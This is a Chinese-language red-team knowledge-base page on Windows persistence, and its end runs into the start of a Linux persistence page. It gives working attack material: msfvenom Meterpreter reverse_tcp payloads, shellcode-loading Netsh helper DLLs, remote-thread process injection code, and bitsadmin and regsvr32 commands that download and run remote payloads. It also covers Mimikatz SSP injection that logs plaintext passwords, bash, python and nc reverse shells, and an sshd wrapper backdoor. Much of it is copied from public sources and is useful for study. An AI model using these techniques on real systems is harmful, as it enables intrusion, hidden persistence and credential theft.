该W32Time将运行在Windows环境作为本地服务，它是通过svchost的执行。 恶意DLL已放入磁盘中，将执行payload。在命令提示符下，可以通过执行以下命令以指向任意DLL的位置来修改时间提供者注册表项。 reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient\" /v DllName /t REG_SZ /d \"C:\\temp\\w32time.dll\" 从注册表编辑器中查看注册表将确认DllName的值已更新。 该服务将在Windows启动期间启动，或者通过执行以下命令手动启动。 sc.exe stop w32time sc.exe start w32time 补充说明 修改Windows时间提供程序可能会向SOC团队发出警报。来自Carbon Black的Scott Lundgren在C中开发了一种称为gametime的时间提供程序。可以使用此DLL来向操作系统注册新的时间提供者，并在其他注册表项中执行修改。这样可以避免滥用现有的Windows时间提供程序，而该时间提供程序可以由SOC监视。Rundll32可用于注册DLL。 Scott Lundgren使用了要在系统上创建的注册表项“ GameTime”。 #define GAMETIME_SVC_KEY_NAME L\"System\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\GameTime\" 根据Microsoft 文档，时间提供者必须实现以下回调函数。 TimeProvOpen TimeProvCommand TimeProvClose TimeProvOpen用于返回提供者句柄，TimeProvCommand用于将命令发送到时间提供者，而TimeProvClose用于关闭时间提供者。 HRESULT __stdcall TimeProvOpen( _In_ WCHAR *wszName, _In_ TimeProvSysCallbacks *pSysCallbacks, _Out_ TimeProvHandle *phTimeProv ) { UNREFERENCED_PARAMETER(pSysCallbacks); UNREFERENCED_PARAMETER(phTimeProv); OutputDebugStringW(wszName); return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE)); } /* * */ HRESULT __stdcall TimeProvCommand( _In_ TimeProvHandle hTimeProv, _In_ TimeProvCmd eCmd, _In_ PVOID pvArgs ) { UNREFERENCED_PARAMETER(hTimeProv); UNREFERENCED_PARAMETER(eCmd); UNREFERENCED_PARAMETER(pvArgs); return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE)); } /* * */ HRESULT __stdcall TimeProvClose( _In_ TimeProvHandle hTimeProv ) { UNREFERENCED_PARAMETER(hTimeProv); return (S_OK); } GameTime提供程序将在系统上填充以下注册表项，因为它们是Microsoft时间提供程序规范的一部分。 DllName, Enabled InputProvider 该DLLNAME指示包含供应商，该DLL的名称启用使然是否提供商应在系统启动过程中启动。值“ 1”启动系统的提供者，而InputProvider指示提供者是输入还是输出。注册表值“ 1”表示已输入提供者。这些在下面的代码中指定： nRet = RegSetValueExW(hkTimeProvider, L\"DllName\", 0, REG_SZ, (LPBYTE)g_wzModule, (DWORD)wcslen(g_wzModule)*sizeof(WCHAR)+sizeof(WCHAR)); if (ERROR_SUCCESS != nRet) { OutputError(L\"RegCreateKeyExW failed\", nRet); goto ErrorExit; } nRet = RegSetValueExW(hkTimeProvider, L\"Enabled\", 0, REG_DWORD, (LPBYTE)&dwOne, sizeof(dwOne)); if (ERROR_SUCCESS != nRet) { OutputError(L\"RegCreateKeyExW failed\", nRet); goto ErrorExit; } nRet = RegSetValueExW(hkTimeProvider, L\"InputProvider\", 0, REG_DWORD, (LPBYTE)&dwOne, sizeof(dwOne)); if (ERROR_SUCCESS != nRet) { OutputError(L\"RegCreateKeyExW failed\", nRet); goto ErrorExit; } 该代码还使用Deregister回调函数从系统中删除创建的注册表项GameTime，作为清理过程。 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\GameTime void CALLBACK Deregister( _In_ HWND hWnd, _In_ HINSTANCE hInst, _In_ LPSTR pwzCmdLine, _In_ int nCmdShow) { long nRet; UNREFERENCED_PARAMETER(hWnd); UNREFERENCED_PARAMETER(hInst); UNREFERENCED_PARAMETER(pwzCmdLine); UNREFERENCED_PARAMETER(nCmdShow); OutputDebugStringW(L\"Unregister\\n\"); nRet = RegDeleteKeyW(HKEY_LOCAL_MACHINE, GAMETIME_SVC_KEY_NAME); if (ERROR_SUCCESS != nRet) { OutputError(L\"RegDeleteKeyW failed!\", nRet); goto ErrorExit; } ErrorExit: return; } 实际上，可以使用rundll32向系统注册DLL，以便创建关联的注册表项，默认情况下，该注册表项将与系统一起启用新的时间提供程序。 rundll32.exe gametime.dll,Register 将创建注册表项GameTime，并且DllName将包含DLL的路径。 再次修改注册表以包含任意DLL，将在服务重新启动期间执行类似于Windows时间提供程序的代码。 该注销功能可用于删除所有相关联的密钥和系统上进行清理。 rundll32.exe gametime.dll,Deregister Print Spooler端口监视器 后台打印程序服务负责管理Windows操作系统中的打印作业。与服务的交互通过打印后台处理程序API执行，该API包含一个函数（AddMonitor），可用于安装本地端口监视器并连接配置、数据和监视器文件。此函数能够将DLL注入spoolsv.exe进程，并且通过创建注册表项，red team operator可以在系统上实现持久性。 Brady Bloxham在Defcon 22上演示了这种持久性技术。应该注意的是，此技术需要管理员级别的特权，并且DLL必须拖放到磁盘上。Mantvydas Baranauskas在他的网站上使用了以下代码，作为他的红队笔记的一部分。 该WINDOWS.H报头包括Winspool.h这是由微软规范所需的头。该MONITOR_INFO_2用于指定必要的监控细节是： pName //监视器名称 pEnvironment //环境架构 pDLLName //监视器DLL文件的名称 #include \"Windows.h\" int main() { MONITOR_INFO_2 monitorInfo; TCHAR env[12] = TEXT(\"Windows x64\"); TCHAR name[12] = TEXT(\"Monitor\"); TCHAR dll[12] = TEXT(\"test.dll\"); monitorInfo.pName = name; monitorInfo.pEnvironment = env; monitorInfo.pDLLName = dll; AddMonitor(NULL, 2, (LPBYTE)&monitorInfo); return 0; } 编译代码将生成一个可执行文件（在本例中为Monitors.exe），该可执行文件将在系统上执行恶意DLL（test.dll）的注册。Metasploit框架可用于生成将服务于Meterpreter有效负载的DLL文件。 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll > test.dll 该DLL必须复制到System32文件夹上，因为根据Microsoft 文档，这是AddMonitor函数的预期位置，以便加载相关的DLL 。 copy C:\\Users\\pentestlab\\Desktop\\test.dll C:\\Windows\\System32 Monitors.exe Monitors.exe必须与恶意DLL位于同一文件夹（System32）中。执行该文件将与Meterpreter建立通信。 但是，为了实现持久性，在“ Monitors ”注册表位置下需要一个密钥。 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors 以下命令将创建一个注册表项，该注册表项将包含值test.dll。从编辑器中查看注册表将验证密钥是否已创建。 reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\Pentestlab\" /v \"Driver\" /d \"test.dll\" /t REG_SZ 下次重新启动时，spoolsv.exe进程将加载Monitors注册表项中存在并存储在Windows文件夹System32中的所有驱动程序DLL文件。 下图演示了Meterpreter会话已建立与Print Spooler服务（SYSTEM）相同级别的特权，并且已从System32文件夹（已删除test.dll的文件夹）执行了执行。 Netsh Helper DLL Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。 生成恶意的DLL msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll > /tmp/pentestlab.dll 添加助手dll netsh add helper path-to-malicious-dll 每次netsh实用程序启动时，都会执行DLL，并且将建立通信。 但是，默认情况下，netsh没有计划自动启动。创建将在Windows启动期间执行实用程序的注册表项将在主机上创建持久性。这可以直接从Meterpreter会话或Windows Shell中完成。 reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Pentestlab /t REG_SZ /d \"C:\\Windows\\SysWOW64\\netsh\" reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\ -v pentestlab -d 'C:\\Windows\\SysWOW64\\netsh' 注册表运行键的替代方法是，可以使用多种其他方法来启动实用程序，例如创建服务或计划任务。 一家总部位于荷兰的IT安全公司，该公司率先在其Github存储库中发布概念证明DLL 。DLL是由Marc Smeets用C编写的，可以对其进行修改以包含自定义的shellcode。Metasploit Framework实用程序“ msfvenom ”可用于生成各种语言的shellcode。 msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp -b '\\x00' -f c 可以将生成的shellcode注入到Netsh Helper DLL代码中。 #include #include // only required if you want to pop calc #ifdef _M_X64 unsigned char buf[] = \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc0\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\"; #else unsigned char buf[] = \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc0\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\"; #endif // Start a separate thread so netsh remains useful. DWORD WINAPI ThreadFunction(LPVOID lpParameter) { LPVOID newMemory; HANDLE currentProcess; SIZE_T bytesWritten; BOOL didWeCopy = FALSE; // Get the current process handle currentProcess = GetCurrentProcess(); // Allocate memory with Read+Write+Execute permissions newMemory = VirtualAllocEx(currentProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (newMemory == NULL) return -1; // Copy the shellcode into the memory we just created didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&buf, sizeof(buf), &bytesWritten); if (!didWeCopy) return -2; // Yay! Let's run our shellcode! ((void(*)())newMemory)(); return 1; } // define the DLL handler 'InitHelpderDll' as required by netsh. // See https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx extern \"C\" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) { //make a thread handler, start the function as a thread, and close the handler HANDLE threadHandle; threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL); CloseHandle(threadHandle); // simple testing by starting calculator system (\"start calc\"); // return NO_ERROR is required. Here we are doing it the nasty way return 0; } 与上述方法类似，rtcrowley在他的Github存储库中发布了该方法的PowerShell版本。以下代码可用于执行PowerShell Base64编码的有效负载，并支持两个选项。 #include #include DWORD WINAPI YahSure(LPVOID lpParameter) { //Option 1: Quick and simple. Opens 1 PS proc & briefly displays window. Set payload to b64 unicode. system(\"start C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -win hidden -nonI -nopro -enc \\ SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBpAG8ATgAuACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\"); //Option 2: Execute loaded b64 into a reg key value. Will spin up a few etra procs, but will not open an extra window. //system(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -c \\ $x=((gp HKLM:SOFTWARE\\\\Microsoft\\\\Notepad debug).debug); \\ powershell -nopro -enc $x 2> nul\"); return 1; } //Custom netsh helper format extern \"C\" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) { HANDLE hand; hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL); CloseHandle(hand); return NO_ERROR; } 执行“ netsh ”实用程序并使用“ add helper ”命令加载系统中的两个DLL都将执行集成的有效负载。 netsh add helper C:\\Users\\pentestlab\\Desktop\\NetshHelperBeacon.dll add helper C:\\Users\\pentestlab\\Desktop\\NetshPowerShell.dll 当执行“ 添加帮助程序 ”命令以加载DLL文件时，将在以下位置创建注册表项。 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NetSh 应该注意的是，某些可能安装在受感染系统上的VPN客户端可能会自动“ netsh ” 启动，因此可能不需要使用其他方法进行持久化。 COM劫持 介绍 微软在Windows 3.11中引入了(Component Object Model, COM)，作为一种实现对象的方法，这些对象可以被不同的框架(ActiveX, COM+， DCOM等)使用，并且在不同的Windows环境中允许互操作性，进程间通信和代码重用。COM对象的滥用使安防团队能够代表受信任的进程执行任意代码。执行COM劫持不需要管理员权限，因为HKCU注册表配置单元中的类在HKLM中的类之前执行。唯一影响高完整性进程(提升)的例外情况是，仅从HKLM位置加载对象，以防止特权提升。 有多种方法可以执行代码，但有几种情况下，COM已被用于持久性攻击中，进行横向移动和防御规避。根据恶意代码执行的方式，在COM劫持期间会使用各种注册表子项。具体如下所示： InprocServer/InprocServer32 LocalServer/LocalServer32 TreatAs ProgID 上述子密钥位于以下注册表组中: HKEY_CURRENT_USER\\Software\\Classes\\CLSID HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID 发现COM密钥，以进行劫持 常见的COM劫持手法有： 增加缺少的CLSID进行利用 修改原有CLSID加载的程序 替换掉CLSID下加载路径的程序 由David Tulis开发的称为acCOMplice的PowerShell脚本可以直接检索系统上存在的缺少的库及其CLSID 持久化 计划任务 Get-ScheduledTaskComHandler，该脚本可以检查主机上所有在用户登录时执行并且容易受到COM劫持的预定任务 Import-Module .\\Get-ScheduledTaskComHandler.ps1 Get-ScheduledTaskComHandler 参数“PersistenceLocations”将检索易受COM劫持的计划任务，这些任务可用于持久性且不需要提升的特权。 CLSID和关联的DLL也将显示在输出中。 Get-ScheduledTaskComHandler -PersistenceLocations 任务“CacheTask”在调用时使用“wininet.dll”并具有以下CLSID：{0358B920-0AC7-461F-98F4-58E32CD89148} 调用“ schtasks”实用程序获取存储位置 schtasks /query /XML /TN \"\\Microsoft\\Windows\\Wininet\\CacheTask\" 参考文章 持久性COM劫持的实现 Persistence – COM Hijacking COM劫持学习 Winlogon用户登录初始化 winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中 HKLM\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\ HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ 对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。 命令行修改 reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Userinit\" /t REG_SZ /d \"C:\\Windows\\system32\\cmd.exe,\" /f powershell一句话修改 Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\WINDOWS NT\\CurrentVersion\\Winlogon\" -name Userinit -value \"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\system32\\cmd.exe\" Logon Scripts后门 Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。 注册表位置: HKEY_CURRENT_USER\\Environment 增加键值对 文件关联（打开方式） 文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的\"打开方式\"进行关联选择。 我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。 用ftype命令显示或修改用在文件扩展名关联中的文件类型。 修改\\HKEY_CLASS_ROOT\\txtfile\\shell\\open\\command的默认值为我们要执行的程序 修改注册表（管理员权限） reg add \"HKCR\\txtfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"C:\\Windows\\system32\\cmd.exe %1\" /f 再打开txt文件打开的是cmd Bitsadmin Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。 从攻击的角度来看，可以滥用此功能，以便在受感染的主机上下载payload（可执行文件，PowerShell脚本，Scriptlet等）并在给定时间执行这些文件，以在红队操作中保持持久性。但是，与“ bitsadmin ” 进行交互需要管理员级别的权限。执行以下命令会将恶意payload从远程位置下载到本地目录。 window7以上自带 .\\bitsadmin.exe /transfer backdoor /download /priority high \"http://192.168.1.106/CM.EXE\" C:\\1.exe 有一个PowerShell cmdlet可以执行相同的任务 Start-BitsTransfer -Source \"http://10.0.2.21/pentestlab.exe\" -Destination \"C:\\tmp\\pentestlab.exe\" 将文件放入磁盘后，可以通过从bitsadmin实用程序执行以下命令来实现持久性。 在创建参数需要作业的名称 该addfile需要文件的远程位置和本地路径 该SetNotifyCmdLine将执行的命令 所述SetMinRetryDelay定义时间回调（秒） 激活传输队列中的新作业或挂起的作业 bitsadmin /create backdoor bitsadmin /addfile backdoor \"http://192.168.1.106/CM.EXE\" \"C:\\1.exe\" bitsadmin /SetNotifyCmdLine backdoor C:\\1.exe NUL bitsadmin /SetMinRetryDelay \"backdoor\" 60 bitsadmin /resume backdoor 参数SetNotifyCmdLine也可以用于通过regsvr32实用程序从远程位置执行scriptlet 。这种方法的好处是它不会接触磁盘，并且可以避开将应用程序列入白名单的产品。 bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll\" bitsadmin /resume backdoor Metasploit框架可用于通过web_delivery模块捕获payload。 use exploit/multi/script/web_delivery set target 3 set payload windows/x64/meterpreter/reverse_tcp set LHOST 10.0.2.21 exploit 进程注入 之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现 如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa 关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程 同样还有shellcode注入 一个demo DWORD CeatRemoThread(DWORD pid) { HANDLE hThread; DWORD dwOldProtect; DWORD dwThreadId; int shellcode_size = sizeof(buf); //混淆 char* newBuf; decrypt(buf, shellcode_size, (LPVOID*)&newBuf); HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid); if (hHandle == NULL) { printf(\"openprocessError\"); free(newBuf); return FALSE; } LPVOID Memory = VirtualAllocEx(hHandle, NULL, sizeof(newBuf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); SIZE_T dwSize = 0; WriteProcessMemory(hHandle, Memory, newBuf, shellcode_size / 3, &dwSize); //Sleep(3000); VirtualProtectEx(hHandle, Memory, shellcode_size / 3, PAGE_EXECUTE, &dwOldProtect); HMODULE hNtdll = LoadLibrary(L\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"[!] LoadNTdll Error,Error is:%d\\n\", GetLastError()); return FALSE; } else { printf(\"[*] Load ntdll.dll Successfully!\\n\"); } #ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown ); #else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown ); #endif typedef_ZwCreateThreadEx ZwCreateThreadEx = NULL; ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, \"ZwCreateThreadEx\"); if (ZwCreateThreadEx == NULL) { printf(\"[!] Get ZwCreateThreadEx Address Error,Error is:%d\\n\", GetLastError()); return FALSE; } else { printf(\"[*] Get ZwCreateThreadEx Address Successfully! Address is %x\\n\", ZwCreateThreadEx); } HANDLE hRemoteThread = NULL; DWORD ZwRet = 0; ZwRet = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hHandle, (LPTHREAD_START_ROUTINE)Memory, NULL, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) { printf(\"[!] Creat RemoteThread Error,Error is:%d\\n\", GetLastError()); getchar(); VirtualFreeEx(hHandle, Memory, 0, MEM_RELEASE); CloseHandle(hHandle); FreeLibrary(hNtdll); return FALSE; } WaitForSingleObject(hRemoteThread, INFINITE); return TRUE; } 屏幕保护程序 利用前提:对方开启了屏幕保护 屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。 在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell，达到一定的权限维持。 注册表位置: HKEY_CURRENT_USER\\Control Panel\\Desktop 命令行修改: reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /d C:\\Windows\\System32\\cmd.exe New-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop\\' -Name 'SCRNSAVE.EXE' -Value 'c:\\tmp\\pentestlab.exe' 这里可以改成我们的马，达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关 WMI构造无文件后门 WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。 无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。 通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。 推荐文章 https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html $filterName = 'SD' $consumerName = 'SDD' $exePath = 'C:\\Windows\\System32\\cmd.exe' $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=200 AND TargetInstance.SystemUpTime 可以使用Autoruns进行查看 安全支持提供者 安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。LSASS进程正在Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补而无需接触磁盘。 该技术可用于收集一个系统或多个系统中的凭据，并将这些凭据与另一个协议（例如RDP，WMI等）结合使用，以免干扰检测，从而在网络中保持持久性。向主机注入恶意安全支持提供程序需要管理员级别的特权，并且可以使用两种方法： 注册SSP DLL 加载到内存 Mimikatz，Empire和PowerSploit支持这两种方法，可以在红队操作中使用。 Mimikatz 方法一 项目Mimikatz提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32 ）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。 将文件传输到C:\\Windows\\System32\\位置后，需要修改注册表项以包括新的安全支持提供程序mimilib。 reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ 查看“安全软件包”注册表项将验证是否已注入恶意安全支持提供程序。 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages 由于注册表已被篡改并且DLL存储在系统中，因此该方法将在重新启动后继续存在。当域用户再次通过系统进行身份验证时，将创建一个名为kiwissp的新文件，该文件将记录帐户的凭据。 C:\\Windows\\System32\\kiwissp.log 方法二 Mimikatz通过向LSASS注入新的安全支持提供程序（SSP）来支持内存技术选项。此技术不需要将mimilib.dll放入磁盘或创建注册表项。但是，缺点是在重新启动过程中不会持续存在。 privilege::debug misc::memssp 当用户再次通过系统进行身份验证时，将在System32中创建一个日志文件，其中将包含纯文本用户密码。 C:\\Windows\\System32\\mimilsa.log PowerSploit PowerSploit包含两个可以执行相同任务的脚本。在Mimikatz的PowerShell变体“ Invoke-Mimikatz ”中，执行以下命令将使用内存中技术。 Import-Module .\\Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \"misc::memssp\" 或者，将恶意的SSP DDL文件传输到目标主机并使用模块Install-SSP将DLL复制到System32，并将自动修改相关的注册表项。 Import-Module .\\PowerSploit.psm1 Install-SSP -Path .\\mimilib.dll Empire Empire提供了两个模块，可用于枚举现有的SSP并在目标系统上安装恶意的SSP。默认情况下，枚举模块将使用活动代理，并且不需要任何其他配置。 usemodule persistence/misc/get_ssps execute 同样，直接查询注册表可以获取存在的SSP的值。 shell reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\" 将恶意安全支持提供程序复制到System32并更新注册表项将结束该技术。 shell copy mimilib.dll C:\\Windows\\System32\\ 由于Empire包含一个模块，该过程可以自动进行，该模块将自动将DLL文件复制到System32并创建注册表项。唯一的要求是在主机上设置mimilib.dll文件的路径。 usemodule persistence/misc/install_ssp* set Path C:\\Users\\Administrator\\mimilib.dll execute Empire还支持可以执行自定义Mimikatz命令的脚本。 usemodule credentials/mimikatz/command set Command misc::memssp execute Empire还支持在进程的内存中注入恶意SSP。下面的模块将调用Mimikatz脚本并直接执行memssp命令，作为使该技术自动化的另一种方法。 usemodule persistence/misc/memssp* execute SharpSploitConsole Mimikatz已集成到SharpSploitConsole中，该应用程序旨在与Ryan Cobb发布的SharpSploit进行交互。SharpSploit是一个.NET后期开发库，具有与PowerSploit类似的功能。当前，SharpSploitConsole通过Mimikatz模块支持内存技术。 SharpSploitConsole_x64.exe Interact Mimi-Command misc::memssp 参考链接 干货 | 最全Windows权限维持总结 Window权限维持（一）：注册表运行键 Window权限维持（二）：计划任务 Window权限维持（三）：服务 Window权限维持（四）：快捷方式修改 Window权限维持（五）：屏幕保护程序 Window权限维持（六）：BITS Jobs Window权限维持（七）：安全支持提供者 Window权限维持（八）：时间服务器 Window权限维持（九）：端口监视器 Window权限维持（十）：Netsh Helper DLL Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 18:56:06 "},"个人知识库/01.渗透测试/04.权限维持/02.Linux权限维持.html":{"url":"个人知识库/01.渗透测试/04.权限维持/02.Linux权限维持.html","title":"02.Linux权限维持","keywords":"","body":" Linux权限维持 自我总结 LINUX反弹shell SSH后门 SSH wrapper SSH 软连接后门 SSH 公钥免密登陆 SSH Keylogger strace监听ssh来源流量 Cron后门 hiding-from-cats vim后门 vim python扩展后门 添加超级用户 SUID后门 Linux/Unix 隐藏文件和文件夹 参数混淆拦截rm 删除/隐藏历史操作命令 参考链接 Linux权限维持 自我总结 直接权限维持 反弹shell SSH SSH warpper SSH 软连接 SSH 公钥免密登陆 SSH Keylogger strace监听ssh来源流量 Crontab vim后门 开机启动项 （自己想的不知道可不可以） .bashrc （自己想的不知道可不可以） 添加超级用户 SUID后门 间接辅助权限维持 cat缺陷 Linux/Unix 隐藏文件和文件夹 参数混淆拦截rm 删除/隐藏历史操作命令 拿到机器后可以查看一下有没有相关程序，反弹shell等进程能够被查到，这条命令可以简单的kill掉一些常见恶意程序。 批量kill可疑进程： ps -ef |grep \"python\" |awk '{print $2}'|xargs kill -9 ps -ef |grep \"bash -i\" |awk '{print $2}'|xargs kill -9 ps -ef |grep \"ew\" |awk '{print $2}'|xargs kill -9 LINUX反弹shell 关于反弹原理，和每一步的数据流向在网上都有文章，就不复制了。这里只是用来总结下常规反弹shell的用法，顺便说下优点缺点。 bash -i >& /dev/tcp/127.0.0.1/6666 0>&1 优点：在大多数Liunx系统上都可以使用 缺点：在路由器系统中不存在bash，存在符号>、& 在反序列化中或者对符号转义的情况下就没有办法反弹了。 python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" 优点：在安装了python上的linux都可以使用，原理还是将标准输入、标准输出、标准错误输出重定向到远程。使用bash交互模式启动。 缺点：在路由器系统中不存在bash或者阉割了python库，存在符号>、& 、'、\"在反序列化中或者对符号转义的情况下就没有办法反弹了。单双引号也会导致闭合问题。 nc -e /bin/bash 127.0.0.1 6666 一般Netcat有两个版本，一个版本是不提供反向连接的版本，一个是全功能版本。这两者的区别就是是否带-e参数，只有带-e参数的版本才支持反向连接。ubuntu 18.04安装的是不提供反向链接的版本。 wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz tar -zxvf netcat-0.7.1.tar.gz -C /usr/local cd /usr/local mv netcat-0.7.1 netcat cd /usr/local/netcat ./configure make && make install 优点：直接反弹，没有多余的符号。 缺点：系统apt默认安装的都是不提供反向链接的版本，需要自己上传编译后的二进制版本。 解决方法1: nc 127.0.0.1 6666|/bin/bash|nc 127.0.0.1 7777 利用6666端口传入内容交给bash执行，再将内容从7777送出去，管道符的用法。可以在阉割功能的nc上使用。 解决方法2: (针对某些mips架构的路由器&busybox终端的系统)： # 锐捷 mkfifo /tmp/backpipe1 | /bin/sh 0/tmp/backpipe1 # 飞鱼星反弹shell mkfifo /tmp/backpipe1 | /bin/sh 0/tmp/backpipe1 SSH后门 SSH wrapper 判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中。 cd /usr/sbin/ mv sshd ../bin vim sshd # 编辑sshd内容为以下 #!/usr/bin/perl exec\"/bin/sh\"if(getpeername(STDIN)=~/^..LF/); # \\x00\\x00LF是19526的大端形式 exec{\"/usr/bin/sshd\"}\"/usr/sbin/sshd\",@ARGV; service sshd restart 在本机执行 socat STDIO TCP4:127.0.0.1:22,sourceport=19265 